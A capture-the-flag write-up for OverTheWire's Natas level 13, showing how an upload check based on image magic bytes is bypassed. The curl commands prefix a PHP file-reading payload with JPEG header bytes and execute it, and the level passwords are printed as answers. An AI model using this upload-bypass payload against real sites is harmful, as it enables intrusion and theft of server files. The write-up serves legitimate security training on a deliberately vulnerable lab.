# Natas Level 13 to 14

| Field | Value |
|---|---|
| Platform | OverTheWire |
| Wargame | Natas |
| Level | 13 -> 14 |
| Status | Complete |

## Objective

Bypass image-type validation and execute uploaded PHP.

## Given Access

User: `natas13`

Password:

```text
trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
```

## Method

The server checks `exif_imagetype`, which accepts files with image magic bytes. Prefix the PHP payload with JPEG header bytes while keeping a `.php` extension.

## Commands

```bash
printf '\xff\xd8\xff\xe0<?php echo file_get_contents("/etc/natas_webpass/natas14"); ?>' > shell.php

resp=$(curl -s -u natas13:trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC \
  -F 'MAX_FILE_SIZE=1000' \
  -F 'filename=shell.php' \
  -F 'uploadedfile=@shell.php;type=image/jpeg' \
  http://natas13.natas.labs.overthewire.org/)

path=$(printf '%s' "$resp" | sed -n 's/.*href="\([^"]*\.php\)".*/\1/p')
curl -s -u natas13:trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC \
  "http://natas13.natas.labs.overthewire.org/$path"
```

## Result

Password for `natas14`:

```text
z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
```

## Lesson

Magic-byte checks alone do not make an upload safe. The execution context and final extension still determine impact.

## References

- https://overthewire.org/wargames/natas/
